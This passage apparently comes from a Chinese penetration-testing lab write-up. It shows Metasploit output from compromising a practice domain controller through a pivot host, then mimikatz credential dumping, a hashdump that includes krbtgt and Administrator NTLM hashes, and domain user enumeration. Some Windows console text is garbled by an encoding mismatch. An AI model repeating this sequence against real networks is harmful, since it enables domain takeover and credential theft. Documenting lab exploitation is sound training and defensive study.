[*] 10.10.10.10:445 - Selecting PowerShell target
[*] 10.10.10.10:445 - Executing the payload...
[+] 10.10.10.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 10.10.10.10:4445
[*] Sending stage (232006 bytes) to 10.10.10.10
[*] Meterpreter session 2 opened (Local Pipe -> Remote Pipe via session 1) at 2026-03-10 04:45:08 -0400

meterpreter >
```

域控拿下了！ Session 2 已建立。msf 通过 WEB 机器（session 1）做跳板，成功连到了域控（session 2）



```bash
meterpreter > sysinfo
Computer        : DC
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : zh_CN
Domain          : DE1AY
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
DC$       DE1AY   219070980bf4243d9fe875a17fc63812  96244f9831eb6ce151382db17f99a21ff
                                                    21e43c5
DC$       DE1AY   395e891d0e12220271cb2c2acbd40ac0  7498a381a33ecb96a3914f47e09152b5e
                                                    1d21a92

wdigest credentials
===================

Username  Domain  Password
--------  ------  --------
(null)    (null)  (null)
DC$       DE1AY   (null)

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DC$       de1ay.com  c6 cf 3a 8d 26 ef 86 46 80 c9 f2 9f a0 18 99 20 ee a9 55 68 7c f
                     1 48 d4 64 63 bf 87 11 d0 c2 bf 6a 4b af 80 cf 91 59 48 56 eb 00
                      97 54 05 ae fd 8f 5a 38 81 dc 38 06 06 ba 8a 16 26 91 bd 9f be
                     2b dd 29 47 1f 6d ed 65 69 b5 c0 f4 03 30 5d 3d 30 70 9e fb 8c c
                     b 46 91 e9 6f f4 f0 ae 93 c6 e2 6e 25 29 72 3a 29 40 aa 1a c2 5d
                      7c 07 39 93 96 58 20 4a 23 a0 00 e5 14 db db b2 f0 d4 e9 83 58
                     8e a1 19 6d ac d6 16 dd a4 fd ac ba b5 b0 37 d6 b9 87 c9 1a 8f 8
                     a 1a d5 6a f9 a0 ed 67 2f 13 ce 70 70 fa e8 5a 95 fb fc 49 5b e9
                      fd 52 b1 df 2c 22 6e 28 59 46 a9 eb 5c 3e d2 fa 39 58 36 69 21
                     f2 99 27 24 a3 43 e2 e9 9f 1e 72 cb 5f 14 65 22 51 93 66 5c 67 5
                     4 3a ac 57 76 ed f4 68 c3 ba fa 93 21 7d 5d cb e0 2d df 98 81 10
                      c9 b7 c5 ea 2e
DC$       de1ay.com  f3 16 04 71 43 c8 7f 01 c5 dd ec 3e bb 76 73 28 a7 57 5d c7 8d 3
                     3 08 1b 86 15 25 c4 22 d0 d9 a4 98 16 1c af d4 74 2c d6 77 fd be
                      93 51 84 35 32 5d ab 48 53 d2 43 ca 1e 72 54 6f 76 32 58 78 d9
                     c1 e0 cd 32 34 b0 f3 3e fe 16 0f 99 2b f0 37 96 df 61 e8 6c 3c 3
                     9 a9 fd 4b 85 ca 00 77 8e 68 43 cc 31 c5 7f f0 f8 83 3d 34 db 52
                      97 dd a7 f3 6f a4 12 a5 ff 4c ea 4c 20 7f 00 a2 5e e0 ef b3 3a
                     59 ae 48 d3 f3 85 ad f0 93 bc 7f 5a 78 6d 3e ef d7 3d df 62 51 6
                     c a9 72 f7 ba 46 70 4d f9 eb 76 2b f4 e0 87 c5 b1 80 88 29 43 fc
                      8f 42 28 7d bd a1 72 73 09 eb 16 98 b6 95 4e 7a 81 c9 61 5b 43
                     45 88 b8 86 91 5b 4a a5 c8 55 08 fc 03 4a f1 61 80 dd 71 5c c4 6
                     c 8c b5 9c 44 3a a7 41 b3 f0 94 16 15 36 06 bc 2b 0c 1e ad e6 95
                      67 dd c1 90 bb
dc$       DE1AY.COM  (null)
dc$       DE1AY.COM  f3 16 04 71 43 c8 7f 01 c5 dd ec 3e bb 76 73 28 a7 57 5d c7 8d 3
                     3 08 1b 86 15 25 c4 22 d0 d9 a4 98 16 1c af d4 74 2c d6 77 fd be
                      93 51 84 35 32 5d ab 48 53 d2 43 ca 1e 72 54 6f 76 32 58 78 d9
                     c1 e0 cd 32 34 b0 f3 3e fe 16 0f 99 2b f0 37 96 df 61 e8 6c 3c 3
                     9 a9 fd 4b 85 ca 00 77 8e 68 43 cc 31 c5 7f f0 f8 83 3d 34 db 52
                      97 dd a7 f3 6f a4 12 a5 ff 4c ea 4c 20 7f 00 a2 5e e0 ef b3 3a
                     59 ae 48 d3 f3 85 ad f0 93 bc 7f 5a 78 6d 3e ef d7 3d df 62 51 6
                     c a9 72 f7 ba 46 70 4d f9 eb 76 2b f4 e0 87 c5 b1 80 88 29 43 fc
                      8f 42 28 7d bd a1 72 73 09 eb 16 98 b6 95 4e 7a 81 c9 61 5b 43
                     45 88 b8 86 91 5b 4a a5 c8 55 08 fc 03 4a f1 61 80 dd 71 5c c4 6
                     c 8c b5 9c 44 3a a7 41 b3 f0 94 16 15 36 06 bc 2b 0c 1e ad e6 95
                      67 dd c1 90 bb


meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf83cd7efde13e0ce754874aaa979a74:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:395e891d0e12220271cb2c2acbd40ac0:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:97940ccfbf51b53267ee2327cff18a57:::
WEB$:1603:aad3b435b51404eeaad3b435b51404ee:2e8c54f1bc3332785e163b4240c82139:::
meterpreter >

meterpreter > shell
Process 2632 created.
Channel 1 created.
Microsoft Windows [�汾 6.3.9600]
(c) 2013 Microsoft Corporation����������Ȩ����

C:\Windows\system32>net group "domain admins" /domain
net group "domain admins" /domain
����     Domain Admins
ע��     ָ���������Ա

��Ա

-------------------------------------------------------------------------------
Administrator
����ɹ���ɡ�


C:\Windows\system32>net user /domain
net user /domain

\\ ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            de1ay                    Guest
krbtgt                   mssql
����������ϣ�������һ����������


C:\Windows\system32>

```

